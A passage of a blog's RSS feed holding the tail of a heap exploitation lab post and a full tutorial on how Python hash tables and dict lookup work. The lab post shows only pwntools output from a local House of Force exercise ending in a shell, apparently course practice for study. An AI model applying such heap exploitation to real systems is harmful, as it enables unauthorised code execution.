&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/home/adamgold/Documents/courses/HeapLAB/.glibc/glibc_2.28_no-tcache/libc-2.28.so&amp;#39;&lt;/span&gt;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Starting local process &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/home/adamgold/Documents/courses/HeapLAB/house_of_force/house_of_force&amp;#39;&lt;/span&gt;: pid &lt;span style=&#34;color:#ae81ff&#34;&gt;23154&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Switching to interactive mode
$ whoami
adamgold
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
        
        </description>
    </item>
    
    <item>
      <title>Python Hash Tables Under the Hood</title>
      <link>https://adamgold.github.io/posts/python-hash-tables-under-the-hood/</link>
      <pubDate>Tue, 30 Jun 2020 18:53:11 +0300</pubDate>
      
      <guid>https://adamgold.github.io/posts/python-hash-tables-under-the-hood/</guid>
      <description>
        
          &lt;img src=&#34;https://adamgold.github.io/img/covers/under_the_hood.jpeg&#34;/&gt;
          
        
        
        &lt;p&gt;Are you a Python developer eager to learn more about the internals of the language, and to better understand how Python hash tables and data structures work? Or maybe you are experienced in other programming languages and want to understand how and where hash tables are implemented in Python? You&amp;rsquo;ve come to the right place!&lt;/p&gt;
&lt;p&gt;By the end of this article, you will have an understanding of:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;What a hash table is&lt;/li&gt;
&lt;li&gt;How and where hash tables are implemented in Python&lt;/li&gt;
&lt;li&gt;How the hash function works&lt;/li&gt;
&lt;li&gt;What&amp;rsquo;s happening under the hood in dictionaries&lt;/li&gt;
&lt;li&gt;The pros and cons of hash tables in Python&lt;/li&gt;
&lt;li&gt;How are Python dictionaries so fast&lt;/li&gt;
&lt;li&gt;How to hash your custom classes&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;This tutorial is aimed at intermediate and proficient Python developers. It assumes basic understanding of &lt;a href=&#34;https://realpython.com/python-dicts/&#34;&gt;Python dictionaries&lt;/a&gt; and sets.&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s dive into looking at Python hash tables!&lt;/p&gt;
&lt;h2 id=&#34;learning-the-basics-of-hash-tables&#34;&gt;Learning the Basics of Hash Tables&lt;/h2&gt;
&lt;p&gt;Before diving into the Python implementation details, you first need to understand what hash tables are and how to use them.&lt;/p&gt;
&lt;h3 id=&#34;what-is-a-hash-table&#34;&gt;What Is a Hash Table&lt;/h3&gt;
&lt;p&gt;Have you ever thought about how a Python dictionary is stored in memory? The memory in our computers can be thought of as a simple array with numeric indexes:&lt;/p&gt;
&lt;p&gt;
&lt;figure class=&#34;white-img-div&#34; &gt;
    
        &lt;img class=&#34;center&#34; src=&#34;https://adamgold.github.io/img/memory-array.png&#34;
             /&gt;
        
    
&lt;/figure&gt;

So how come Python knows which value belongs to which key, when using non numeric keys? The simplest solution would be to have each element in the array store both key and value, iterate over the array and check element by element, until finding the one that contains the desired key. This solution is far from being perfomance efficient, as it would require iterating through the array repeatedly &amp;ndash; And this is where hash tables come to play.&lt;/p&gt;
&lt;p&gt;A hash table is a structure that is designed to store a list of key-value pairs, without compromising on speed and efficiency of manipulating and searching the structure.&lt;/p&gt;
&lt;p&gt;A hash table uses a &lt;strong&gt;hash function&lt;/strong&gt; to compute an index, into an array of slots, from which the desired value can be found.&lt;/p&gt;
&lt;h3 id=&#34;how-does-a-hash-function-work&#34;&gt;How Does a Hash Function Work&lt;/h3&gt;
&lt;p&gt;A hash function, in its simplest form, is a function that computes the index of the key-value pair â€” so you can quickly insert, search and remove elements in your memory array.&lt;/p&gt;
&lt;p&gt;You should start off with a simple example: A dictionary-like object, containing 3 products and their inventory count.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;avocados&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;oranges&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;apples&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As for the hash function, you would need a method to turn the string keys into numeric values so you can quickly look them up in the memory.&lt;/p&gt;
&lt;div class=&#34;toast add-margin&#34;&gt;
	&lt;div class=&#34;toast__content&#34;&gt;
		&lt;p class=&#34;toast__type&#34;&gt;Try it yourself&lt;/p&gt;
		&lt;p class=&#34;toast__message dark-text&#34;&gt;
			Try to think of a simple operation to perform on string values to turn them into numeric values.
		&lt;/p&gt;
		&lt;div class=&#34;toggle-solution&#34; id=&#34;basic-hash&#34;&gt;Show Solution&lt;/div&gt;
		&lt;div class=&#34;solution dark-text&#34; id=&#34;solution-basic-hash&#34;&gt;
			There are many methods for achieveing that. How about calculating the length of each key?
		&lt;/div&gt;
	&lt;/div&gt;
&lt;/div&gt;

&lt;p&gt;So you&amp;rsquo;ve decided to calculate the length of the string values, awesome! Don&amp;rsquo;t forget that the numeric values must be within 0 to 3 for them to fit inside the 3 elements array. You can use the modulo operator on the lengths for that:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;length of the key &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; table_size (&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;For example, &lt;code&gt;avocados&lt;/code&gt; has 8 letters, therefore it would be placed in the 2nd index. This is the final array:&lt;/p&gt;

&lt;figure class=&#34;white-img-div&#34; &gt;
    
        &lt;img class=&#34;center&#34; src=&#34;https://adamgold.github.io/img/first-hash-table.png&#34;
             /&gt;
        
    
&lt;/figure&gt;

&lt;p&gt;Hurrah! You&amp;rsquo;ve just built your first hash table! Hold on for a second there. What happens when two keys has the same length? You won&amp;rsquo;t be able to insert both at the same index. This is called a &lt;strong&gt;hash collision&lt;/strong&gt;.&lt;/p&gt;
&lt;h3 id=&#34;how-to-handle-collisions&#34;&gt;How to Handle Collisions&lt;/h3&gt;
&lt;p&gt;Hash collisions are practically unavoidable when hashing a random subset of a large set of possible keys. There are multiple strategies for collision handling - All of which require that the keys be stored in the table, together with the associated values. Two of the most common ones are &lt;strong&gt;Open Addressing&lt;/strong&gt; and &lt;strong&gt;Separate Chaining&lt;/strong&gt;.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Open Addressing:&lt;/strong&gt; When a hash collision occurs, this algorithm proceeds in some probe sequence until an unoccupied slot is found. This startegy consists of storing all records in a single array. For example, a simple implementation of this strategy would be to proceed one element further every time that the calculated index is already occupied, until an unoccupied spot is found. This implementation is called &lt;strong&gt;linear probing&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Consider the following example of a simple hash table mapping names to phone numbers using your hash function from earlier:&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;figure class=&#34;white-img-div&#34; &gt;
    
        &lt;img class=&#34;center&#34; src=&#34;https://adamgold.github.io/img/open-addressing.png&#34;
             /&gt;
        
    
&lt;/figure&gt;

&lt;p&gt;&lt;em&gt;John&lt;/em&gt; and &lt;em&gt;Lisa&lt;/em&gt; collide since they both hash to the index &lt;code&gt;0&lt;/code&gt;. &lt;em&gt;Lisa&lt;/em&gt; was inserted after &lt;em&gt;John&lt;/em&gt;, so it got inserted into one index further - &lt;code&gt;1&lt;/code&gt;. Note that &lt;em&gt;Sandra Dee&lt;/em&gt; has a unique hash, but nevertheless collided with &lt;em&gt;Lisa Smith&lt;/em&gt;, that had previously collided with &lt;em&gt;John Smith&lt;/em&gt;.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Separate Chaining:&lt;/strong&gt; As opposed to open addressing, this strategy consists of storing multiple arrays. Each record contains a separate array which holds all of the elements with the same calculated index. The following is the sample table from earlier, using the separate chaining strategy:&lt;/li&gt;
&lt;/ul&gt;

&lt;figure class=&#34;white-img-div&#34; &gt;
    
        &lt;img class=&#34;center&#34; src=&#34;https://adamgold.github.io/img/separate-chaining.png&#34;
             /&gt;
        
    
&lt;/figure&gt;

&lt;p&gt;This time, &lt;em&gt;Sandra Dee&lt;/em&gt; did not collide with &lt;em&gt;Sandra&lt;/em&gt; since each element holds a pointer to an array of collided records.&lt;/p&gt;
&lt;h2 id=&#34;understanding-python-hash-tables&#34;&gt;Understanding Python Hash Tables&lt;/h2&gt;
&lt;p&gt;When you come to think about it, Python dictionary keys allow way more types than just integers. They can be strings, functions, and more. How does Python store these keys inside the memory, and know where to find their values?&lt;/p&gt;
&lt;p&gt;You guessed it right - hash tables! Python implements hash tables under the hood, an implementation that is completely unvisible for you as a developer. Nonetheless, it could be of great use for you to understand how Python hash tables are implemented, their optimizations, and how to use them wisely.&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s dive into some of the internals to better understand how all of these new concepts you&amp;rsquo;ve just learned are put to practice.&lt;/p&gt;
&lt;h3 id=&#34;exploring-python-hash-function&#34;&gt;Exploring Python Hash Function&lt;/h3&gt;
&lt;p&gt;Python hash function takes a hashable object and hashes into 32/64 bits (depends on the system architecture). The bits are well distributed as can be seen in the following example, showing two very similar strings - &amp;ldquo;consecutive strings&amp;rdquo;, commonly used in dictionaries, with very different hash values:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;{0:b}&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(hash(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;hash1&amp;#39;&lt;/span&gt;))
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;110000010001001001011000101001010110101110010010000001101111&amp;#39;&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;{0:b}&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(hash(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;hash&amp;#39;&lt;/span&gt;))
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;101110001101101111011001100001110000000110011011000110110000&amp;#39;&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This distribution lowers the odds of a hash collision, which in turn makes the dictionary much faster. Furthermore, you should know that a hash value is only constant for the current instance of the process. You might have stumbled upon different hashes of the same object and wondered why it happened. The main reason for this phenomenon is security related: Hash tables are vulnerable to hash collision DoS attacks when using constant hash values. Python 3.6 introduced an implementation of &lt;a href=&#34;https://en.wikipedia.org/wiki/SipHash&#34;&gt;SipHash&lt;/a&gt; to prevent these attacks. You can read more about it on &lt;a href=&#34;https://www.python.org/dev/peps/pep-0456/&#34;&gt;PEP 456&lt;/a&gt;. The following demonstrates different hashes on two different runs:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; hash(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hash&amp;#34;&lt;/span&gt;)
&lt;span style=&#34;color:#ae81ff&#34;&gt;832529968546820528&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# different run&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; hash(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hash&amp;#34;&lt;/span&gt;)
&lt;span style=&#34;color:#ae81ff&#34;&gt;8049792375956551724&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;handling-collisions-in-python&#34;&gt;Handling Collisions in Python&lt;/h3&gt;
&lt;p&gt;Python uses &lt;strong&gt;open addressing&lt;/strong&gt; to resolve hash coliisions. Python source code suggets that open addressing is preferred over chaining since the link overhead for chaining would be substantial. Earlier, you&amp;rsquo;ve seen an example of linear probing. Python uses &lt;strong&gt;random probing&lt;/strong&gt;, as can be seen in the &lt;a href=&#34;https://github.com/python/cpython/blob/master/Objects/dictobject.c#L163&#34;&gt;source code&lt;/a&gt;, or in this very simplified Python code:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;perturb &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; hash
perturb &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;
new_hash &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (current_index&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; perturb)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Much like linear probing, the first part of this algorithm proceeds in a fixed manner (&lt;code&gt;current_index*5+1&lt;/code&gt;). Python core developers found it to be good in common cases where hash keys are consecutive. The other part of this algorithm is what makes it random - The &lt;code&gt;perturb&lt;/code&gt; variable depends on the actual bits of the hash, and as you&amp;rsquo;ve seen before - They are well distributed and not often the same even for similar keys.&lt;/p&gt;
&lt;h3 id=&#34;deleting-elements-using-dummy-values&#34;&gt;Deleting Elements Using Dummy Values&lt;/h3&gt;
&lt;p&gt;In a perfect world with no collisions, deleting elements would be simple: just remove the element at the desired index so it can be refilled with other values. Unfortunately, we do not live in a perfect world, and collisions happen frequently. Remember the open addressing example from before?&lt;/p&gt;

&lt;figure class=&#34;white-img-div&#34; &gt;
    
        &lt;img class=&#34;center&#34; src=&#34;https://adamgold.github.io/img/open-addressing.png&#34;
             /&gt;
        
    
&lt;/figure&gt;

&lt;p&gt;Now assume you wanted to delete &lt;em&gt;John Smith&lt;/em&gt; from the table. Seems trivial, right? Hash &lt;em&gt;John Smith&lt;/em&gt; and delete the element located at the calculated index. Now, you might have already noticed the problem in this approach. After deleting &lt;em&gt;John&lt;/em&gt;, &lt;em&gt;Sandra&lt;/em&gt; is unreachable! Hashing &lt;em&gt;Sandra&lt;/em&gt; will get us to an empty slot. For this exact reason, Python implements dummy values - Instead of completely erasing &lt;em&gt;John&amp;rsquo;s&lt;/em&gt; element, it would place a fixed dummy value there. When the algorithm faces a dummy value, it knows that there was a value there but it got deleted. It then keeps probing forward.&lt;/p&gt;
&lt;h3 id=&#34;implementing-everything-with-python&#34;&gt;Implementing Everything With Python&lt;/h3&gt;
&lt;p&gt;Now that you know what hash tables are, how the Python hash function works and how Python handles collisions, it&amp;rsquo;s time to see these things in action by exploring the implementation of a dictionary and the lookup method. The lookup method is used in all operations: search, insertion and deletion.&lt;/p&gt;
&lt;p&gt;First thing you need to know is that Python &lt;a href=&#34;https://github.com/python/cpython/blob/master/Objects/dictobject.c#L104&#34;&gt;initializes a dict with an 8 element array&lt;/a&gt;. Experiments showed that this size suffices for most common dicts, usually created to pass keyword arguments. Each element in the array holds a &lt;a href=&#34;https://github.com/python/cpython/blob/e42b705188271da108de42b55d9344642170aa2b/Objects/dict-common.h#L4&#34;&gt;structure&lt;/a&gt; that contains the key, value and the hash. The hash is stored in order to not recompute it with each increase in the size of the dictionary (further explained in &lt;em&gt;Exploring Python Hash Tables Optimizations: Dictionary Resize&lt;/em&gt;).&lt;/p&gt;
&lt;div class=&#34;toast toast--blue add-margin&#34;&gt;
	&lt;div class=&#34;toast__content&#34;&gt;
		&lt;p class=&#34;toast__type&#34;&gt;Note&lt;/p&gt;
		&lt;p class=&#34;toast__message&#34;&gt;
			Up until now, memory indices were displayed as decimal values. From this point onward, you will notice that memory addresses will be displayed as binary integers. Don&amp;rsquo;t be scared! You can continue reading even if you&amp;rsquo;re not familiar with them - I only use it for you to better understand how Python hash tables work with bits, but it&amp;rsquo;s not mandatory to understand that.
		&lt;/p&gt;
	&lt;/div&gt;
&lt;/div&gt;

&lt;p&gt;On to the &lt;a href=&#34;https://github.com/python/cpython/blob/master/Objects/dictobject.c#L760&#34;&gt;lookup method&lt;/a&gt;. Here&amp;rsquo;s a simplified Python version, followed by an explanation:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 1&lt;/span&gt;    DUMMY &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 2&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lookup&lt;/span&gt;(key: Any, hash_: int) &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; Tuple[int, Any]:
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 3&lt;/span&gt;        mask &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; len(table) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 4&lt;/span&gt;        freeslot &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; None
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 5&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; index &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; generate_probes(hash_, mask):
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 6&lt;/span&gt;            elem &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; table[index]
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 7&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; elem &lt;span style=&#34;color:#f92672&#34;&gt;is&lt;/span&gt; None:
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 8&lt;/span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (index, None) &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; freeslot &lt;span style=&#34;color:#f92672&#34;&gt;is&lt;/span&gt; None &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; (freeslot, DUMMY)
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 9&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; elem &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; DUMMY:
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;10&lt;/span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; freeslot &lt;span style=&#34;color:#f92672&#34;&gt;is&lt;/span&gt; None:
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;11&lt;/span&gt;                    freeslot &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; index
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;12&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; elem&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;key &lt;span style=&#34;color:#f92672&#34;&gt;is&lt;/span&gt; key &lt;span style=&#34;color:#f92672&#34;&gt;or&lt;/span&gt; (elem&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hash &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; hash_ &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; elem&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;key &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; key):
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;13&lt;/span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (index, elem)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Line 5&lt;/strong&gt; calculates the index with the &lt;code&gt;generate_probes&lt;/code&gt; method shown in the next code block below.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Line 8&lt;/strong&gt; checks if the found index is empty, and returns a tuple &lt;code&gt;(index, None)&lt;/code&gt; for the caller to handle (search operation would raise a KeyError, insertion would insert), unless a dummy was found earlier, in which case return &lt;code&gt;(index, DUMMY)&lt;/code&gt; for the caller to handle (search operation would raise KeyError but it had to continue searching after the dummy).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Line 9&lt;/strong&gt; checks if the found index contains a dummy value, if so it keeps searching and saving that index for &lt;strong&gt;line 8&lt;/strong&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Line 12&lt;/strong&gt; compares the identities of the keys. If they are the same object, the index is returned.&lt;/p&gt;
&lt;p&gt;If not, it compares the key value &lt;strong&gt;and the hash&lt;/strong&gt;. As it is known, equal objects should have equal hashes, which means that objects with different hashes are not equal. If both are equal, the index is returned.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;If the desired element hasn&amp;rsquo;t been found yet (remember that the slot wasn&amp;rsquo;t empty/dummy), this is a hash collision situation - In which the script goes back to the &lt;code&gt;generate_probes&lt;/code&gt; method to compute the random new hash and then go back to the first step.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;generate_probes&lt;/span&gt;(hash_: int, mask: int) &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; Iterable[int]:
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;2&lt;/span&gt;        index &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; hash_ &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; mask
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;3&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;yield&lt;/span&gt; index
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;4&lt;/span&gt;        perturb &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; hash_
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;5&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; True:
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;6&lt;/span&gt;            new_hash &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; index &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; perturb
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;7&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;yield&lt;/span&gt; new_hash &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; mask
&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;8&lt;/span&gt;            perturb &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Line 3&lt;/strong&gt; masks the hash bits with the size of the table minus one - For example, in a table with the size of 8, the last 3 bits would be taken (111 in binary equals 7 in decimal, so 3 bits can represent 0-7). The following demonstration shows a hash example with its last 3 bits taken for indexing:&lt;/li&gt;
&lt;/ul&gt;

&lt;figure class=&#34;white-img-div&#34; &gt;
    
        &lt;img class=&#34;center&#34; src=&#34;https://adamgold.github.io/img/last_3_bits.png&#34;
             /&gt;
        
    
&lt;/figure&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Line 7&lt;/strong&gt;: Remember that the algorithm goes back to the &lt;code&gt;generate_probes&lt;/code&gt; method if the desired wasn&amp;rsquo;t found? This is the line that it goes back to. It computes the new hash using a random probe and yields control back to the &lt;code&gt;lookup&lt;/code&gt; method.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;If you were to write the search operation, it would have looked along the lines of the following:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;search&lt;/span&gt;(key: Any) &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; Any:  &lt;span style=&#34;color:#75715e&#34;&gt;# usually implemented as __getitem__&lt;/span&gt;
